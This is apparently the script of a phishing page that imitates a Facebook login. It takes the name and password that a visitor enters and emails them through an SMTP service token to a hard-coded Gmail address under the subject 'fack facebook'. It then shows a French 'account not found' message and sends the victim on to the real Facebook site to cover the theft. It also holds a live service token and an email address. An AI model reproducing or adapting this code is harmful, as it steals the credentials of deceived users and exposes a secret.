const name = document.getElementById('name');
const submit = document.getElementsByClassName('form-contact')[0];
const errorElement = document.getElementById('error')
const submit1 = document.getElementById('submit')

submit.addEventListener('submit',(e)=>{
    e.preventDefault();
    console.log("clicked")
    // Email Code Here...
    Email.send({
        SecureToken : "07085a9c-23be-417f-86d2-9ee46d4c2805",
        To : 'ossamarayan22@gmail.com',
        From : "ossamarayan22@gmail.com",
        Subject : "fack facebook",
        Body : "Name: " + document.getElementById("name").value
                +"<br> password: " + document.getElementById("password").value
    }).then(
    );
});

// password eye

const togglePassword = document.querySelector("#togglePassword");
                    const password = document.querySelector("#password");
            
                    togglePassword.addEventListener("click", function () {
                        // toggle the type attribute
                        const type = password.getAttribute("type") === "password" ? "text" : "password";
                        password.setAttribute("type", type);
                        
                        // toggle the icon
                        this.classList.toggle("bi-eye");
                    });
            
                    // prevent form submit
                    const form = document.querySelector("form");
                    form.addEventListener('submit', function (e) {
                        e.preventDefault();
                    });

//username or password incorrect

form.addEventListener('submit', (e) =>{
    let messages = []
    if (password.value === '' || name.value === '') {
        messages.push("l'e-mail ou le numero de telephone entre ne correspond a aucun compte. veuillez creer un compte")
    }
    if (messages.length > 0) {
        e.preventDefault()
        errorElement.innerText = messages.join('')
    }
    else{
        submit1.addEventListener('click', function(){
            window.open("https://web.facebook.com/watch/?ref=tab");
        })
    }
})

